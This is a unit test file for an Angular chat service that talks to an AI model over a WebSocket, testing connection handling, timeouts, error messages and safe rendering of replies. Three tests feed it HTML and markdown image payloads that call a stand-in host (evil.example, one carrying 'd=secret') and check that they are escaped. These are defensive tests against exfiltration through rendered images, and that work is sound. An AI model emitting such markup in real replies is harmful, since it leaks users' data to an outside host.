import { SecurityContext, signal } from '@angular/core';
import { DomSanitizer } from '@angular/platform-browser';
import {
    createServiceFactory,
    SpectatorService,
} from '@ngneat/spectator/vitest';
import {
    OrganisationService,
    setCurrentUser,
    setNotifyOutlet,
    SettingsService,
    StaffUser,
} from '@placeos/common';

vi.mock('@placeos/ts-client', { spy: true });

import * as client from '@placeos/ts-client';
import { ChatService } from '../lib/chat/chat.service';

/** WebSocket stand-in that records instances */
class FakeSocket {
    public static readonly CONNECTING = 0;
    public static readonly OPEN = 1;
    public static readonly CLOSING = 2;
    public static instances: FakeSocket[] = [];
    public readyState = FakeSocket.OPEN;
    public onmessage: ((e: MessageEvent) => void) | null = null;
    public onerror: ((e: Event) => void) | null = null;
    public onclose: (() => void) | null = null;
    public close = vi.fn();
    public send = vi.fn();
    public listeners: Record<string, () => void> = {};
    public addEventListener = vi.fn(
        (name: string, fn: () => void) => (this.listeners[name] = fn),
    );
    public removeEventListener = vi.fn(
        (name: string) => delete this.listeners[name],
    );
    constructor(public url: string) {
        FakeSocket.instances.push(this);
    }
}

describe('ChatService', () => {
    let spectator: SpectatorService<ChatService>;
    const original_socket = window.WebSocket;
    const createService = createServiceFactory({
        service: ChatService,
        providers: [
            {
                provide: OrganisationService,
                useValue: {
                    active_building: signal({ id: 'bld-1' }),
                    binding: () => '',
                },
            },
            { provide: SettingsService, useValue: { get: vi.fn() } },
        ],
    });

    // Workspace modules cannot be mocked here, so spy on the snackbar outlet
    // that `notifyError` uses
    const snackbar = {
        open: vi.fn(() => ({
            onAction: () => ({ subscribe: () => undefined }),
            dismiss: () => undefined,
        })),
    };

    beforeEach(() => {
        snackbar.open.mockClear();
        setNotifyOutlet(snackbar as never);
        FakeSocket.instances = [];
        (window as unknown as { WebSocket: unknown }).WebSocket = FakeSocket;
        vi.mocked(client.getModule).mockImplementation(
            () =>
                ({
                    variable: () => ({
                        bind: () => () => null,
                        listen: () => ({ subscribe: () => () => null }),
                    }),
                }) as unknown as ReturnType<typeof client.getModule>,
        );
        setCurrentUser(new StaffUser({ id: 'user-1' }));
        spectator = createService();
        spectator.service.setBinding('sys-1');
    });

    afterEach(() => {
        window.WebSocket = original_socket;
        vi.useRealTimers();
    });

    it('should keep a new chat when the previous socket closes late', () => {
        spectator.service.startChat();
        const first = FakeSocket.instances[0];
        spectator.service.endChat();
        spectator.service.startChat();
        expect(FakeSocket.instances).toHaveLength(2);
        first.onclose?.();
        expect(spectator.service.connected).toBe(true);
    });

    it('should forget the current socket when it closes', () => {
        spectator.service.startChat();
        FakeSocket.instances[0].onclose?.();
        expect(spectator.service.connected).toBe(false);
    });

    it('should open a new chat to send a message after the chat ends', () => {
        spectator.service.startChat();
        spectator.service.endChat();

        spectator.service.sendMessage('Hello');

        expect(FakeSocket.instances).toHaveLength(2);
        expect(FakeSocket.instances[1].send).toHaveBeenCalledWith('Hello');
    });

    it('should not show a message that it cannot send', () => {
        spectator.service.setBinding('');

        expect(spectator.service.sendMessage('Hello')).toBe(false);

        expect(FakeSocket.instances).toHaveLength(0);
        expect(spectator.service.messages()).toEqual([]);
        expect(snackbar.open).toHaveBeenCalled();
    });

    it('should show an error and give the text back if the chat closes before it opens', () => {
        spectator.service.startChat();
        const socket = FakeSocket.instances[0];
        socket.readyState = FakeSocket.CONNECTING;

        expect(spectator.service.sendMessage('Hello')).toBe(true);
        socket.onerror?.(new Event('error'));
        socket.onclose?.();

        expect(socket.send).not.toHaveBeenCalled();
        expect(snackbar.open).toHaveBeenCalledTimes(1);
        expect(spectator.service.unsent()).toBe('Hello');
        expect(spectator.service.messages()).toEqual([]);
    });

    it('should show an error if the chat closes before a reply arrives', () => {
        spectator.service.sendMessage('Book a room');
        FakeSocket.instances[0].onclose?.();

        expect(snackbar.open).toHaveBeenCalled();
        expect(spectator.service.unsent()).toBe('Book a room');
        expect(spectator.service.messages()).toEqual([]);
        expect(spectator.service.connected).toBe(false);
    });

    it('should stop waiting for a reply after a time with no frames', () => {
        vi.useFakeTimers();
        spectator.service.sendMessage('Hello');
        const socket = FakeSocket.instances[0];

        vi.advanceTimersByTime(10 * 60 * 1000);

        expect(socket.close).toHaveBeenCalled();
        expect(snackbar.open).toHaveBeenCalledTimes(1);
        expect(vi.getTimerCount()).toBe(0);
    });

    it('should ignore frames that have no text', () => {
        spectator.service.startChat();
        const socket = FakeSocket.instances[0];
        socket.onmessage({
            data: JSON.stringify({ chat_id: 'c-1' }),
        } as MessageEvent);
        socket.onmessage({
            data: JSON.stringify({
                type: 'progress',
                function: 'call_function',
            }),
        } as MessageEvent);
        socket.onmessage({ data: 'not json' } as MessageEvent);

        expect(spectator.service.messages()).toEqual([]);
        expect(spectator.service.progress().function).toBe('call_function');
    });

    it('should clear progress when the chat closes', () => {
        spectator.service.startChat();
        FakeSocket.instances[0].onmessage({
            data: JSON.stringify({ type: 'progress', message: 'Working' }),
        } as MessageEvent);

        spectator.service.close();

        expect(spectator.service.progress()).toBeNull();
    });

    it('should send the message once the chat opens', () => {
        spectator.service.startChat();
        const socket = FakeSocket.instances[0];
        socket.readyState = FakeSocket.CONNECTING;

        spectator.service.sendMessage('Hello');
        socket.listeners['open']();

        expect(socket.send).toHaveBeenCalledWith('Hello');
        expect(socket.listeners['close']).toBeUndefined();
        expect(snackbar.open).not.toHaveBeenCalled();
    });

    it('should show images and raw HTML from the assistant as text', () => {
        spectator.service.startChat();
        const socket = FakeSocket.instances[0];
        socket.onmessage({
            data: JSON.stringify({
                type: 'response',
                message:
                    '**Hi** ![<b>x</b>](https://evil.example/?d=1) <img src="https://evil.example/">',
            }),
        } as MessageEvent);
        const [message] = spectator.service.messages();
        expect(message.content).toContain('<strong>Hi</strong>');
        expect(message.content).not.toContain('<img');
        expect(message.content).not.toContain('<b>');
        expect(message.content).toContain('&lt;img src=');
    });

    it('should open assistant links in a new tab with no opener', () => {
        spectator.service.startChat();
        FakeSocket.instances[0].onmessage({
            data: JSON.stringify({
                type: 'response',
                message:
                    'See [the map](https://maps.example/) or https://x.example/',
            }),
        } as MessageEvent);
        const [message] = spectator.service.messages();
        const html = spectator
            .inject(DomSanitizer)
            .sanitize(SecurityContext.HTML, message.content);
        const links = new DOMParser()
            .parseFromString(html, 'text/html')
            .querySelectorAll('a');
        expect(links).toHaveLength(2);
        for (const link of Array.from(links)) {
            expect(link.target).toBe('_blank');
            expect(link.rel).toBe('noopener noreferrer');
        }
    });

    it('should not render HTML that follows an inline code tag', () => {
        spectator.service.startChat();
        FakeSocket.instances[0].onmessage({
            data: JSON.stringify({
                type: 'response',
                message:
                    'hi <code><img/src=//evil.example/?d=secret></code> & ![Tom & Jerry](x.png)',
            }),
        } as MessageEvent);
        const [message] = spectator.service.messages();
        expect(message.content).not.toContain('<img');
        expect(message.content).not.toContain('<code>');
        expect(message.content).toContain('Tom &amp; Jerry');
        expect(message.content).not.toContain('&amp;amp;');
    });
});
